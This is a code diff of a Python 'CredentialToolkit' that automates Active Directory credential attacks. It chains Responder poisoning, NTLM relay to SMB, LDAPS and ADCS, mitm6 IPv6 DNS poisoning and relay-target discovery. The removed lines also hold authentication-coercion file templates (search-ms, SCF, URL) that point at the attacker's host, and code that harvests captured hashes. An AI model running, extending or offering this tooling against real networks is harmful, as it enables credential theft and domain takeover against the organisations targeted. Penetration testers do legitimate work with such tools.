@@ -10,19 +10,19 @@ import argparse
 import netifaces
 from datetime import datetime
 from pathlib import Path
-from threading import Thread
+from threading import Thread, Event
 from termcolor import colored
 from subprocess import Popen, PIPE
+import signal
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
 class AuditTrail:
-    """Track all actions and their results"""
-    
     def __init__(self, output_dir):
-        self.output_dir = output_dir
-        self.audit_file = output_dir / 'audit.json'
+        self.output_dir = Path(output_dir)
+        self.output_dir.mkdir(parents=True, exist_ok=True)
+        self.audit_file = self.output_dir / 'audit.json'
         self.events = []
         self.start_time = datetime.now()
         
@@ -33,7 +33,6 @@ class AuditTrail:
         })
     
     def add_event(self, event_type, details):
-        """Add an event to the audit trail"""
         event = {
             'timestamp': datetime.now().isoformat(),
             'type': event_type,
@@ -41,92 +40,27 @@ class AuditTrail:
         }
         self.events.append(event)
         self.save()
-        
-    def add_command(self, command, success, output=None, error=None):
-        """Track command execution"""
-        self.add_event('command', {
-            'command': command,
-            'success': success,
-            'output': output,
-            'error': error
-        })
-    
-    def add_result(self, result_type, details):
-        """Track attack results"""
-        self.add_event('result', {
-            'result_type': result_type,
-            'details': details
-        })
     
     def save(self):
-        """Save audit trail to file"""
         try:
+            # Ensure directory exists
+            self.audit_file.parent.mkdir(parents=True, exist_ok=True)
+            
             audit_data = {
                 'start_time': self.start_time.isoformat(),
                 'end_time': datetime.now().isoformat(),
                 'events': self.events
             }
-            self.audit_file.write_text(json.dumps(audit_data, indent=2))
+            
+            # Write with error handling
+            try:
+                with self.audit_file.open('w') as f:
+                    json.dump(audit_data, f, indent=2)
+            except Exception as e:
+                logger.error(f"Failed to write audit file: {e}")
+                
         except Exception as e:
-            logger.error(f"Error saving audit trail: {str(e)}")
-            logger.exception("Exception occurred")
-
-def check_dependencies():
-    """Check if required tools are installed"""
-    required_tools = {
-        'nxc': 'NetExec (pipx install git+https://github.com/Pennyw0rth/NetExec.git)',
-        'impacket-ntlmrelayx': 'Impacket (pipx install git+https://github.com/fortra/impacket.git)',
-        'responder': 'Responder (pipx install git+https://github.com/lgandx/Responder.git)',
-        'mitm6': 'mitm6 (pipx install mitm6)',
-        'certipy': 'Certipy (pipx install git+https://github.com/ly4k/Certipy.git)'
-    }
-    
-    missing_tools = []
-    for tool, install_info in required_tools.items():
-        if not shutil.which(tool):
-            missing_tools.append(f"{tool} - {install_info}")
-    
-    if missing_tools:
-        print(colored("\nMissing required tools:", 'red'))
-        for tool in missing_tools:
-            print(colored(f"[-] {tool}", 'red'))
-        print("\nPlease run the install script before continuing.")
-        sys.exit(1)
-
-class CoerceTemplates:
-    """Templates for authentication coercion"""
-    
-    SEARCH_MS = """<?xml version="1.0" encoding="UTF-8"?>
-<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
-<description>Microsoft Outlook</description>
-<isSearchOnlyItem>false</isSearchOnlyItem>
-<includeInStartMenuScope>true</includeInStartMenuScope>
-<iconReference>imageres.dll,-1002</iconReference>
-<folderType>{{91475FE5-586B-4EBA-8D75-D17434B8CDF6}}</folderType>
-<simpleLocation>
-<url>\\\\{server}\\share\\</url>
-</simpleLocation>
-</searchConnectorDescription>"""
-
-    SCF = """[Shell]
-Command=2
-IconFile=\\\\{server}\\share\\icon.ico
-[Taskbar]
-Command=ToggleDesktop"""
-
-    URL = """[InternetShortcut]
-URL=file://{server}/share/
-IconFile=\\\\{server}\\share\\icon.ico
-IconIndex=1"""
-
-    PRINT = """<?xml version="1.0" encoding="UTF-8"?>
-<descendantfonts>
-<print>
-<properties xmlns="http://schemas.microsoft.com/windows/2006/propertiesschema">
-<property name="System.ItemNameDisplay">\\\\{server}\\share\\file</property>
-</properties>
-</print>
-</descendantfonts>"""
+            logger.error(f"Error saving audit trail: {e}")
 
 class CredentialToolkit:
     def __init__(self, args):
@@ -134,505 +68,328 @@ class CredentialToolkit:
         self.iface = args.interface or self.get_default_interface()
         self.local_ip = self.get_local_ip(self.iface)
         self.processes = []
-        self.templates = CoerceTemplates()
-        self.http_server = None
+        self.stop_event = Event()
         
-        # Setup output and audit
-        timestamp = time.strftime("%Y%m%d-%H%M%S")
+        # Setup output directory with timestamp
+        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
         self.output_dir = Path('output') / timestamp
-        self.setup_output_directory()
+        self.output_dir.mkdir(parents=True, exist_ok=True)
+        
+        # Initialize audit trail
         self.audit = AuditTrail(self.output_dir)
         
-        # Log initialization
-        self.setup_logging()
-        
-    def setup_logging(self):
-        """Setup file logging"""
-        log_file = self.output_dir / 'toolkit.log'
-        file_handler = logging.FileHandler(log_file)
-        file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
-        logger.addHandler(file_handler)
-        
-    def setup_output_directory(self):
-        """Setup output directory structure"""
-        try:
-            # Create main output directory
-            self.output_dir.mkdir(parents=True, exist_ok=True)
-            
-            # Create subdirectories
-            (self.output_dir / 'hashes').mkdir(exist_ok=True)
-            (self.output_dir / 'relay').mkdir(exist_ok=True)
-            (self.output_dir / 'adcs').mkdir(exist_ok=True)
-            (self.output_dir / 'logs').mkdir(exist_ok=True)
-            
-            # Symlink Responder logs
-            responder_logs = Path('/usr/share/responder/logs')
-            if responder_logs.exists():
-                os.symlink(responder_logs, self.output_dir / 'responder')
-                
-            return True
-            
-        except Exception as e:
-            self.print_bad(f"Error setting up output directory: {str(e)}")
-            logger.error(f"Error setting up output directory: {str(e)}")
-            return False
+        # Setup signal handlers
+        signal.signal(signal.SIGINT, self.signal_handler)
+        signal.signal(signal.SIGTERM, self.signal_handler)
+
+    def signal_handler(self, signum, frame):
+        self.print_info("\nReceived signal to stop. Cleaning up...")
+        self.stop_event.set()
+        self.cleanup()
+        sys.exit(0)
 
     def get_default_interface(self):
-        """Get default network interface"""
-        return netifaces.gateways()['default'][netifaces.AF_INET][1]
+        try:
+            return netifaces.gateways()['default'][netifaces.AF_INET][1]
+        except Exception as e:
+            logger.error(f"Error getting default interface: {e}")
+            return "eth0"  # Fallback
 
     def get_local_ip(self, iface):
-        """Get local IP address"""
-        return netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
-
-    def setup_coercion_files(self):
-        """Generate authentication coercion files"""
         try:
-            web_dir = Path('web')
-            web_dir.mkdir(exist_ok=True)
+            return netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
+        except Exception as e:
+            logger.error(f"Error getting local IP: {e}")
+            return "127.0.0.1"  # Fallback
+
+    def setup_directory_structure(self):
+        """Create all necessary directories"""
+        try:
+            dirs = ['hashes', 'relay', 'adcs', 'logs', 'web']
+            for d in dirs:
+                (self.output_dir / d).mkdir(parents=True, exist_ok=True)
             
-            files = {
-                'search.search-ms': self.templates.SEARCH_MS,
-                'share.scf': self.templates.SCF,
-                'share.url': self.templates.URL,
-                'print.xml': self.templates.PRINT
-            }
+            # Create Responder logs symlink with proper error handling
+            responder_logs = Path('/usr/share/responder/logs')
+            responder_link = self.output_dir / 'responder'
             
-            for filename, template in files.items():
+            if responder_logs.exists() and not responder_link.exists():
                 try:
-                    content = template.format(server=self.local_ip)
-                    (web_dir / filename).write_text(content)
-                    self.audit.add_event('file_created', {
-                        'file': str(web_dir / filename),
-                        'type': 'coercion'
-                    })
+                    os.symlink(responder_logs, responder_link)
                 except Exception as e:
-                    self.print_bad(f"Error creating {filename}: {str(e)}")
-                    continue
+                    logger.error(f"Failed to create Responder logs symlink: {e}")
             
-            self.print_good(f"Generated coercion files in {web_dir}")
             return True
         except Exception as e:
-            self.print_bad(f"Error in setup_coercion_files: {str(e)}")
+            self.print_bad(f"Error setting up directory structure: {e}")
             return False
 
+    def run_command(self, cmd, timeout=None):
+        """Execute command with improved error handling and timeout"""
+        try:
+            logger.info(f"Running command: {cmd}")
+            
+            process = Popen(
+                cmd.split(),
+                stdout=PIPE,
+                stderr=PIPE,
+                universal_newlines=True,
+                bufsize=1
+            )
+            
+            self.processes.append(process)
+            
+            def monitor_output():
+                try:
+                    while process.poll() is None and not self.stop_event.is_set():
+                        output = process.stdout.readline()
+                        if output:
+                            logger.info(output.strip())
+                except Exception as e:
+                    logger.error(f"Error monitoring process output: {e}")
+            
+            # Start output monitoring in background
+            Thread(target=monitor_output, daemon=True).start()
+            
+            if timeout:
+                def kill_on_timeout():
+                    time.sleep(timeout)
+                    if process.poll() is None:
+                        process.terminate()
+                
+                Thread(target=kill_on_timeout, daemon=True).start()
+            
+            return process
+            
+        except Exception as e:
+            self.print_bad(f"Error running command '{cmd}': {e}")
+            return None
+
     def find_relay_targets(self):
-        """Find potential relay targets (SMB signing disabled)"""
+        """Find potential relay targets with retry mechanism"""
         try:
             self.print_info("Finding relay targets...")
             cmd = f"nxc smb {self.args.target_range} --gen-relay-list targets.txt"
-            proc = self.run_command(cmd)
-            proc.wait()
             
-            if Path('targets.txt').exists():
-                # Copy targets file to output directory
-                shutil.copy('targets.txt', self.output_dir / 'relay' / 'targets.txt')
-                self.audit.add_event('targets_found', {
-                    'range': self.args.target_range,
-                    'file': str(self.output_dir / 'relay' / 'targets.txt')
-                })
-                return True
-            return False
-        except Exception as e:
-            self.print_bad(f"Error finding relay targets: {str(e)}")
-            return False
-
-    def edit_responder_conf(self):
-        """Configure Responder settings"""
-        try:
-            conf_path = Path('/usr/share/responder/Responder.conf')
-            if not conf_path.exists():
-                self.print_bad("Responder.conf not found")
+            process = self.run_command(cmd)
+            if not process:
                 return False
                 
-            content = conf_path.read_text()
-            protocols = ['HTTP', 'SMB'] if self.args.relay else []
-            for proto in protocols:
-                content = content.replace(f"{proto} = On", f"{proto} = Off")
+            # Wait for completion with timeout
+            try:
+                process.wait(timeout=30)
+            except Exception as e:
+                logger.error(f"Timeout waiting for target discovery: {e}")
+                process.terminate()
+                return False
             
-            conf_path.write_text(content)
-            if protocols:
-                self.print_good(f"Disabled protocols in Responder.conf: {', '.join(protocols)}")
-                self.audit.add_event('responder_config', {
-                    'disabled_protocols': protocols
-                })
-            return True
+            targets_file = Path('targets.txt')
+            if targets_file.exists():
+                # Copy to output directory
+                shutil.copy(targets_file, self.output_dir / 'relay' / 'targets.txt')
+                return True
+                
+            return False
+            
         except Exception as e:
-            self.print_bad(f"Error editing Responder.conf: {str(e)}")
+            self.print_bad(f"Error in find_relay_targets: {e}")
             return False
 
-    def monitor_responder_logs(self):
-        """Monitor Responder logs for new hashes"""
-        responder_dir = Path('/usr/share/responder/logs')
-        if not responder_dir.exists():
-            return
-            
-        initial_files = set(responder_dir.glob('*-NTLMv2-*.txt'))
-        
-        while True:
-            time.sleep(5)
-            current_files = set(responder_dir.glob('*-NTLMv2-*.txt'))
-            new_files = current_files - initial_files
-            
-            for f in new_files:
-                hash_content = f.read_text()
-                self.audit.add_result('hash_captured', {
-                    'file': str(f),
-                    'hash': hash_content
-                })
-                # Copy hash file to output directory
-                shutil.copy(f, self.output_dir / 'hashes')
-                initial_files.add(f)
-
     def start_responder(self):
-        """Start Responder for hash capture"""
+        """Start Responder with proper configuration"""
         try:
-            cmd = f'responder -I {self.iface} -wv'
+            cmd_parts = [
+                'responder',
+                '-I', self.iface,
+                '-wv'  # Always enable verbose output
+            ]
+            
             if self.args.analyze:
-                cmd += ' -A'
+                cmd_parts.append('-A')
             if self.args.challenge:
-                cmd += f' --lm --disable-ess'
+                cmd_parts.extend(['--lm', '--disable-ess'])
             if self.args.dhcp:
-                cmd += ' -d'
-                
-            proc = self.run_command(cmd)
-            self.audit.add_event('responder_started', {
-                'command': cmd,
-                'pid': proc.pid if proc else None
-            })
+                cmd_parts.append('-d')
             
-            # Start log monitoring in background
-            Thread(target=self.monitor_responder_logs, daemon=True).start()
+            cmd = ' '.join(cmd_parts)
+            process = self.run_command(cmd)
             
-            return proc
+            if process:
+                # Give Responder time to initialize
+                time.sleep(3)
+                if process.poll() is None:
+                    self.print_good("Responder started successfully")
+                    return process
+            
+            self.print_bad("Failed to start Responder")
+            return None
+            
         except Exception as e:
-            self.print_bad(f"Error starting Responder: {str(e)}")
+            self.print_bad(f"Error starting Responder: {e}")
             return None
 
     def start_ntlmrelay(self):
-        """Start ntlmrelayx with appropriate options"""
+        """Start NTLM relay with appropriate configuration"""
+        if not self.args.relay:
+            return None
+            
         try:
-            if not self.args.relay:
-                return None
-                
-            options = [
+            cmd_parts = [
+                'impacket-ntlmrelayx',
                 '-tf', 'targets.txt',
                 '-smb2support',
                 '-l', str(self.output_dir / 'relay'),
                 '-of', str(self.output_dir / 'relay' / 'ntlmrelay.log')
             ]
-
+            
             if self.args.socks:
-                options.append('-socks')
+                cmd_parts.append('-socks')
             
             if self.args.relay_type:
                 if self.args.relay_type == 'ldaps':
-                    options.extend(['-t', f'ldaps://{self.args.dc_ip}', '--delegate-access'])
+                    cmd_parts.extend(['-t', f'ldaps://{self.args.dc_ip}', '--delegate-access'])
                 elif self.args.relay_type == 'smb':
-                    options.extend(['--no-http-server', '--no-smb-server'])
+                    cmd_parts.extend(['--no-http-server', '--no-smb-server'])
                 elif self.args.relay_type == 'adcs':
-                    options.extend(['-t', f'http://{self.args.dc_ip}/certsrv/certfnsh.asp'])
-
-            cmd = f'impacket-ntlmrelayx {" ".join(options)}'
-            proc = self.run_command(cmd)
-            self.audit.add_event('ntlmrelay_started', {
-                'command': cmd,
-                'pid': proc.pid if proc else None,
-                'type': self.args.relay_type
-            })
-            return proc
+                    cmd_parts.extend(['-t', f'http://{self.args.dc_ip}/certsrv/certfnsh.asp'])
+            
+            cmd = ' '.join(cmd_parts)
+            process = self.run_command(cmd)
+            
+            if process:
+                # Give relay time to initialize
+                time.sleep(3)
+                if process.poll() is None:
+                    self.print_good("NTLM relay started successfully")
+                    return process
+            
+            self.print_bad("Failed to start NTLM relay")
+            return None
+            
         except Exception as e:
-            self.print_bad(f"Error starting NTLM relay: {str(e)}")
+            self.print_bad(f"Error starting NTLM relay: {e}")
             return None
 
     def start_mitm6(self):
-        """Start mitm6 for IPv6 poisoning"""
+        """Start mitm6 for IPv6 attacks"""
+        if not self.args.ipv6 or not self.args.domain:
+            return None
+            
         try:
-            if not self.args.ipv6 or not self.args.domain:
-                return None
-                
             cmd = f'mitm6 -d {self.args.domain} -i {self.iface}'
-            proc = self.run_command(cmd)
-            self.audit.add_event('mitm6_started', {
-                'command': cmd,
-                'pid': proc.pid if proc else None,
-                'domain': self.args.domain
-            })
-            return proc
-        except Exception as e:
-            self.print_bad(f"Error starting mitm6: {str(e)}")
+            process = self.run_command(cmd)
+            
+            if process:
+                # Give mitm6 time to initialize
+                time.sleep(3)
+                if process.poll() is None:
+                    self.print_good("mitm6 started successfully")
+                    return process
+            
+            self.print_bad("Failed to start mitm6")
             return None
-
-    def start_http_server(self):
-        """Start HTTP server for coercion files"""
-        try:
-            web_dir = Path('web')
-            if not web_dir.exists():
-                self.print_bad("Web directory not found")
-                return None
-
-            os.chdir(str(web_dir))
-            from http.server import HTTPServer, SimpleHTTPRequestHandler
             
-            class AuditingHandler(SimpleHTTPRequestHandler):
-                def do_GET(self):
-                    self.server.toolkit.audit.add_event('http_request', {
-                        'path': self.path,
-                        'client': self.client_address[0]
-                    })
-                    return super().do_GET()
-            
-            server = HTTPServer(("", self.args.port), AuditingHandler)
-            server.toolkit = self  # Pass reference to toolkit for auditing
-# part 2
-            server_thread = Thread(target=server.serve_forever)
-            server_thread.daemon = True
-            server_thread.start()
-            
-            self.print_good(f"Started HTTP server on port {self.args.port}")
-            self.audit.add_event('http_server_started', {
-                'port': self.args.port,
-                'directory': str(web_dir)
-            })
-            return server
         except Exception as e:
-            self.print_bad(f"Error starting HTTP server: {str(e)}")
+            self.print_bad(f"Error starting mitm6: {e}")
             return None
-
-    def run_command(self, cmd):
-        """Execute command and return process"""
-        try:
-            logger.debug(f"Running command: {cmd}")
-            proc = Popen(cmd.split(), stdout=PIPE, stderr=PIPE)
-            self.processes.append(proc)
-            
-            # Start output monitoring thread
-            def monitor_output(proc):
-                while True:
-                    output = proc.stdout.readline()
-                    if not output and proc.poll() is not None:
-                        break
-                    if output:
-                        logger.info(output.strip().decode())
-                        self.audit.add_event('command_output', {
-                            'pid': proc.pid,
-                            'output': output.strip().decode()
-                        })
-            
-            Thread(target=monitor_output, args=(proc,), daemon=True).start()
-            return proc
-        except Exception as e:
-            self.print_bad(f"Error running command '{cmd}': {str(e)}")
-            return None
-
-    def generate_report(self):
-        """Generate HTML report of attack results"""
-        report_file = self.output_dir / 'report.html'
-        
-        # Basic HTML template
-        html = f"""
-        <html>
-        <head>
-            <title>Attack Report - {time.strftime("%Y-%m-%d %H:%M:%S")}</title>
-            <style>
-                body {{ font-family: Arial, sans-serif; margin: 40px; }}
-                .section {{ margin: 20px 0; padding: 10px; border: 1px solid #ccc; }}
-                .success {{ color: green; }}
-                .error {{ color: red; }}
-            </style>
-        </head>
-        <body>
-            <h1>Attack Report</h1>
-            <div class="section">
-                <h2>Environment</h2>
-                <p>Interface: {self.iface}</p>
-                <p>Local IP: {self.local_ip}</p>
-                <p>Target Range: {self.args.target_range}</p>
-            </div>
-        """
-        
-        # Add audit trail
-        html += """
-            <div class="section">
-                <h2>Audit Trail</h2>
-                <pre>{}</pre>
-            </div>
-        """.format(json.dumps(self.audit.events, indent=2))
-        
-        # Add results summary
-        html += """
-            <div class="section">
-                <h2>Results Summary</h2>
-        """
-        
-        # Check Responder logs
-        responder_dir = self.output_dir / 'responder'
-        if responder_dir.exists():
-            hash_files = list(responder_dir.glob('*-NTLMv2-*.txt'))
-            if hash_files:
-                html += f"<p class='success'>Captured {len(hash_files)} NTLMv2 hashes</p>"
-                
-        # Check relay results
-        relay_dir = self.output_dir / 'relay'
-        if relay_dir.exists():
-            relay_log = relay_dir / 'ntlmrelay.log'
-            if relay_log.exists():
-                html += f"<p>Relay Results:</p><pre>{relay_log.read_text()}</pre>"
-        
-        html += """
-            </div>
-        </body>
-        </html>
-        """
-        
-        report_file.write_text(html)
-        self.print_good(f"Generated report: {report_file}")
 
     def auto_attack(self):
-        """Run automated attack sequence"""
+        """Run automated attack sequence with proper timing"""
         try:
             self.print_info("Starting automated attack sequence...")
-            self.audit.add_event('attack_started', {
-                'mode': 'auto',
-                'interface': self.iface,
-                'target_range': self.args.target_range
-            })
             
-            # 1. Initial recon
-            self.print_info("Phase 1: Initial Reconnaissance")
+            # Setup directory structure
+            if not self.setup_directory_structure():
+                return
             
-            # Check for broadcast protocols
-            self.print_info("Checking for broadcast protocols (LLMNR/NBT-NS)...")
-            analyze_proc = self.run_command(f'responder -I {self.iface} -A')
-            time.sleep(10)
-            analyze_proc.terminate()
-            
-            # Find potential relay targets
-            self.print_info("Scanning for relay targets...")
+            # Phase 1: Initial Recon
+            self.print_info("Phase 1: Reconnaissance")
             targets_found = self.find_relay_targets()
             
             if targets_found:
                 self.print_good("Found potential relay targets")
             else:
-                self.print_bad("No relay targets found")
-
-            # Check for ADCS web endpoints
-            if self.args.dc_ip:
-                self.print_info("Checking for ADCS...")
-                adcs_proc = self.run_command(f'nxc ldap {self.args.dc_ip} -M adcs')
-                adcs_proc.wait()
+                self.print_info("No relay targets found - continuing with hash capture only")
             
-            # 2. Setup attack infrastructure
-            self.print_info("Phase 2: Setting Up Attack Infrastructure")
+            # Phase 2: Start Core Services
+            self.print_info("Phase 2: Starting Core Services")
             
-            # Configure Responder
-            if not self.edit_responder_conf():
-                return
-                
-            # Setup coercion files
-            if not self.setup_coercion_files():
-                return
-
-            # Start HTTP server
-            self.http_server = self.start_http_server()
-            if not self.http_server:
+            # Start Responder first
+            responder_proc = self.start_responder()
+            if not responder_proc:
                 return
             
-            # 3. Start core services
-            self.print_info("Phase 3: Starting Core Services")
-            responder = self.start_responder()
+            # Give Responder time to initialize fully
+            time.sleep(5)
             
-            # 4. Start relay attacks if targets found
+            # Start NTLM relay if targets were found
             if targets_found:
-                self.print_info("Phase 4: Starting Relay Attacks")
-                
-                # SMB relay with SOCKS
-                ntlmrelay_smb = self.start_ntlmrelay()
-                logger.info("Started SMB relay with SOCKS")
-                
-                if self.args.dc_ip:
-                    # LDAPS relay for delegation
-                    ntlmrelay_ldaps = self.run_command(
-                        f'impacket-ntlmrelayx -t ldaps://{self.args.dc_ip} --delegate-access'
-                    )
-                    logger.info("Started LDAPS relay for delegation")
-                    
-                    # ADCS relay
-                    ntlmrelay_adcs = self.run_command(
-                        f'impacket-ntlmrelayx -t http://{self.args.dc_ip}/certsrv/certfnsh.asp'
-                    )
-                    logger.info("Started ADCS relay")
-            else:
-                logger.warning("No relay targets found. Skipping relay attacks.")
+                relay_proc = self.start_ntlmrelay()
+                if relay_proc:
+                    self.print_good("NTLM relay started successfully")
+                    time.sleep(3)
             
-            # 5. Start IPv6 attack if domain specified and IPv6 attacks enabled
-            if self.args.domain and self.args.ipv6:
-                self.print_info("Phase 5: Starting IPv6 Attack")
+            # Start mitm6 if requested
+            if self.args.ipv6 and self.args.domain:
                 mitm6_proc = self.start_mitm6()
-                
-                if self.args.dc_ip:
-                    # Additional LDAPS relay specifically for mitm6
-                    ntlmrelay_mitm6 = self.run_command(
-                        f'impacket-ntlmrelayx -t ldaps://{self.args.dc_ip} --delegate-access --add-computer'
-                    )
-                    logger.info("Started LDAPS relay for mitm6")
+                if mitm6_proc:
+                    self.print_good("mitm6 started successfully")
+                    time.sleep(3)
             
-            self.print_info("Attack infrastructure deployed - Monitoring for captures/relays")
-            self.print_info(f"Coercion files available at: http://{self.local_ip}:{self.args.port}/")
-            
-            # Print attack summary
-            self.print_info("\nActive Attack Channels:")
+            self.print_info("\nAttack infrastructure deployed and running")
+            self.print_info("Active attack channels:")
             self.print_info("- NetBIOS/LLMNR Poisoning")
             if targets_found:
                 self.print_info("- SMB Relay with SOCKS")
-                if self.args.dc_ip:
-                    self.print_info("- LDAPS Delegation Attack")
-                    self.print_info("- ADCS Certificate Attack")
-            if self.args.domain and self.args.ipv6:
-                self.print_info("- IPv6 DNS Takeover")
+            if self.args.ipv6:
+                self.print_info("- IPv6 DNS Poisoning")
             
+            # Main monitoring loop
             try:
-                while True:
+                while not self.stop_event.is_set():
+                    # Check if processes are still running
+                    if responder_proc and responder_proc.poll() is not None:
+                        self.print_bad("Responder process died - restarting...")
+                        responder_proc = self.start_responder()
+                    
+                    if targets_found and relay_proc and relay_proc.poll() is not None:
+                        self.print_bad("NTLM relay process died - restarting...")
+                        relay_proc = self.start_ntlmrelay()
+                    
                     time.sleep(1)
+                    
             except KeyboardInterrupt:
-                self.print_info('\nStopping attack sequence...')
-            finally:
-                self.cleanup()
+                self.print_info("\nReceived keyboard interrupt - stopping...")
                 
         except Exception as e:
-            self.print_bad(f"Error in auto_attack: {str(e)}")
-            logger.exception("Exception occurred in auto_attack")
-            self.audit.add_event('error', {
-                'phase': 'auto_attack',
-                'error': str(e)
-            })
+            self.print_bad(f"Error in auto_attack: {e}")
+            logger.exception("Exception in auto_attack")
+            
         finally:
             self.cleanup()
 
     def cleanup(self):
-        """Cleanup processes and files"""
+        """Clean up processes and resources"""
+        self.print_info("Cleaning up...")
+        
+        for process in self.processes:
+            try:
+                if process.poll() is None:
+                    process.terminate()
+                    try:
+                        process.wait(timeout=5)
+                    except:
+                        process.kill()
+            except Exception as e:
+                logger.error(f"Error cleaning up process: {e}")
+        
+        # Final audit save
         try:
-            for proc in self.processes:
-                try:
-                    proc.terminate()
-                    proc.wait(timeout=2)
-                except:
-                    proc.kill()
-
-            if self.http_server:
-                self.http_server.shutdown()
-
-            # Generate final report
-            self.generate_report()
-            
-            # Final audit entry
-            self.audit.add_event('attack_completed', {
-                'output_dir': str(self.output_dir),
-                'report': str(self.output_dir / 'report.html')
+            self.audit.add_event('cleanup_completed', {
+                'timestamp': datetime.now().isoformat()
             })
-
         except Exception as e:
-            self.print_bad(f"Error in cleanup: {str(e)}")
+            logger.error(f"Error in final audit save: {e}")
 
     def print_bad(self, msg): print(colored('[-] ', 'red') + msg)
     def print_info(self, msg): print(colored('[*] ', 'blue') + msg)
@@ -664,8 +421,29 @@ def parse_args():
     
     return parser
 
+def check_dependencies():
+    """Check if required tools are installed"""
+    required_tools = {
+        'nxc': 'NetExec (pipx install git+https://github.com/Pennyw0rth/NetExec.git)',
+        'impacket-ntlmrelayx': 'Impacket (pipx install git+https://github.com/fortra/impacket.git)',
+        'responder': 'Responder (pipx install git+https://github.com/lgandx/Responder.git)',
+        'mitm6': 'mitm6 (pipx install mitm6)'
+    }
+    
+    missing_tools = []
+    for tool, install_info in required_tools.items():
+        if not shutil.which(tool):
+            missing_tools.append(f"{tool} - {install_info}")
+    
+    if missing_tools:
+        print(colored("\nMissing required tools:", 'red'))
+        for tool in missing_tools:
+            print(colored(f"[-] {tool}", 'red'))
+        print("\nPlease install missing tools before continuing.")
+        sys.exit(1)
+
 def main():
-    if os.geteuid():
+    if os.geteuid() != 0:
         print(colored('[-] ', 'red') + 'Script must run as root')
         sys.exit(1)
         
@@ -673,12 +451,22 @@ def main():
     
     parser = parse_args()
     args = parser.parse_args()
+    
+    # Create and start toolkit
     toolkit = CredentialToolkit(args)
-
+    
     if args.auto:
         toolkit.auto_attack()
     else:
         parser.print_help()
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(colored('\n[*] ', 'blue') + 'Interrupted by user')
+        sys.exit(0)
+    except Exception as e:
+        print(colored('[-] ', 'red') + f'Unhandled error: {str(e)}')
+        logging.exception("Unhandled exception in main")
+        sys.exit(1)
